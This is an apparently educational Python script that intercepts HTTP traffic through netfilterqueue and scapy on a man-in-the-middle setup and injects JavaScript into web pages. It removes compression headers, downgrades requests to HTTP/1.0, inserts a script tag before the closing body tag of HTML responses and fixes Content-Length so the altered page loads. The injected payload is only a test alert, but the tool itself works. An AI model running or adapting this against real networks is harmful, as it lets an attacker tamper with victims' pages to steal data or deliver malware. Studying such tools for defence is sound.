#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # get_payload() shows raw packet data
    # to be able to modify - convert raw packet which is unreadable into scapy packet in which we can see all layers

    if scapy_packet.haslayer(scapy.Raw):  # in scapy, data sent in Http layer is placed in Raw layer
        load = scapy_packet[scapy.Raw].load
        # print(scapy_packet.show())
        # if dport(destination port) is http, then packet is a request
        # if sport(source port) is http, then packet is a response
        if scapy_packet[
            scapy.TCP].dport == 10000:  # changed from 80 to 10000 as we have iptables rule redirecting packets
            print("[+] HTTP Request")
            # remove Accept-Encoding header so response will have html in plain text, and then we can modify it.
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # non-greedy match
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            # 1.1 sends response in chunks, will cause problem with our method of modifying content-length, so use 1.0

        elif scapy_packet[
            scapy.TCP].sport == 10000:  # changed from 80 to 10000 as we have iptables rule redirecting packets
            print("[+] HTTP Response")
            # print scapy_packet.show()
            before_injection = load
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            after_injection = load
            # if length changes after injection, browser would terminate connection and whole html content wouldn't load
            # so change Content-length property
            if len(before_injection) != len(after_injection):
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                # ^mark first group as non-capturing - used to locate the pattern but will not be captured
                # capture the second group that is the content-length size
                if content_length_search and "text/html" in load:  # only if response contains html page,
                    # don't change content length if response is for images etc. will cause bad request error.
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    print("content length %s new content length %s" % (content_length, new_content_length))
                    load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()  # accept the packet to forward it to destination else it is remains in queue forever
    # packet.drop()  # drop the packet, net connection can be cut this way as packets don't reach destination


queue = netfilterqueue.NetfilterQueue()
# create a netfilterqueue instance
queue.bind(0, process_packet)
# bind this queue to the queue (0) we created using the shell command
# process_packet is a callback executed on each packet in this queue
queue.run()
# run the queue else it will not run
